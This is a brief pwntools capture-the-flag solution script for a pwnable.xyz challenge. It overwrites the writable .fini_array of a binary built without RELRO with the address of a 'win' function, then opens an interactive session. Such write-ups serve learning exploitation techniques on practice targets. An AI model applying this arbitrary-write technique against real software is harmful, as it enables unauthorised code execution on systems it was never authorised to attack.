###no-relro -> fini_array is writeable

from pwn import *

###Addr
fini_array = 0x600bc0
win = 0x400821

###Exploit
r = remote('svc.pwnable.xyz',30033)
r.sendlineafter('Addr: ',str(fini_array))
r.sendlineafter('Value: ',str(win))
r.interactive()
